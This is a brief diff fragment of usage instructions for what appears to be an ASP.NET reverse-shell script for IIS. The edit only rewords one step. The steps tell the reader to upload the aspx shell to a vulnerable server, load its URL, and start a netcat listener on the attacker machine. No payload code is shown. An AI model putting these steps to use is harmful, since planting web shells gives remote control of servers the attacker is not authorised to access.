@@ -6,7 +6,7 @@ Instructions:
 1.) Upload aspx script to iis .net web server vulnerable to: 
 xss/csrf/lfi/rfi
 
-2.) Navigate to URL upload path:
+2.) Navigate to URL path of upload:
 http://example.com/iis_asp_dot_net_reverse_shell.aspx
 
 3.) Setup listening port with netcat from attacker machine:
